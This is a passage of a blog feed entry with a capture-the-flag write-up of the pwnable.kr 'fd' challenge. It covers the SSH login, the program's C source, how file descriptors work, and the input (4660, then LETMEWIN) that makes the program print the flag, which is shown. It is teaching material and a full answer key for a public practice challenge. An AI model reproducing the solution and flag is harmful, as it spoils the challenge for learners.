-&lt;p&gt;In order to view the challenge, we have to connect via &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt; with password &lt;strong&gt;&lt;em&gt;guest&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % ssh fd@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
-fd@pwnable.krs password:
- ____  __    __  ____    ____  ____   _        ___      __  _  ____  
-|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
-|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
-|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|
-
-- Site admin : daehee87.kr@gmail.com
-- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
-- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
-- files under /tmp can be erased anytime. make your directory under /tmp
-- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
-Last login: Thu Nov 23 11:25:25 2017 from 131.202.114.32
-fd@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 40
-drwxr-x---  5 root   fd   4096 Oct 26  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 80 root   root 4096 Jan 11  2017 ..
-d---------  2 root   root 4096 Jun 12  2014 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 fd_pwn fd   7322 Jun 11  2014 fd
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root   root  418 Jun 11  2014 fd.c
-&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 fd_pwn root   50 Jun 11  2014 flag
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root   root  128 Oct 26  2016 .gdb_history
-dr-xr-xr-x  2 root   root 4096 Dec 19  2016 .irssi
-drwxr-xr-x  2 root   root 4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;In this directory we have the challenge files - source code and binary. Firstly, let’s view the source to understand what’s going on.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass argv[1] a number&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LETMEWIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;good job :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;learn about Linux file IO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;By reading it, we get that firstly &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] )&lt;/code&gt; will convert the argument into the integer, then it will substract from it &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1234&lt;/code&gt;. After converting it into decimal we get number &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;4660&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After that &lt;code class=&quot;highlighter-rouge&quot;&gt;read(fd, buf, 32)&lt;/code&gt; syscall is executed. First argument of this function &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is the file descriptor of where to read the input. Then &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; is the character array where the read content will be stored and &lt;code class=&quot;highlighter-rouge&quot;&gt;32&lt;/code&gt; is the number of bytes to read before truncating the data. The last step compares the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; with a string &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEWIN\n&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;How can we enter this string to make the condition true? Firstly, we can learn that file descriptor is simply an integer that is used to access a file, or IO resource. Read more at &lt;a href=&quot;https://en.wikipedia.org/wiki/File_descriptor&quot; title=&quot;Wikipedia&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Each Unix process should have three standard &lt;strong&gt;&lt;em&gt;POSIX&lt;/em&gt;&lt;/strong&gt; file descriptors. With respective integers &lt;strong&gt;&lt;em&gt;0&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;, &lt;strong&gt;&lt;em&gt;1&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stdout&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;2&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stderr&lt;/em&gt;&lt;/strong&gt;. In our attack we’re going to use &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;, since it’s going to allow us to enter characters from the keyboard.&lt;/p&gt;
-
-&lt;p&gt;To make the &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; equall to 0, we’re going to make the &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] )&lt;/code&gt; equall to the &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;. Then substraction will result in 0, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt; function will read the characters that we enter.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;fd@ubuntu:~$ ./fd 4660
-LETMEWIN
-good job :)
-mommy! I think I know what a file descriptor is!!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here goes the flag!&lt;/p&gt;
-</description>
-        <pubDate>Thu, 23 Nov 2017 08:00:00 +0000</pubDate>
-        <link>http://localhost:4000/pwnable.kr-fd/</link>
-        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-fd/</guid>
       </item>
     
   </channel>
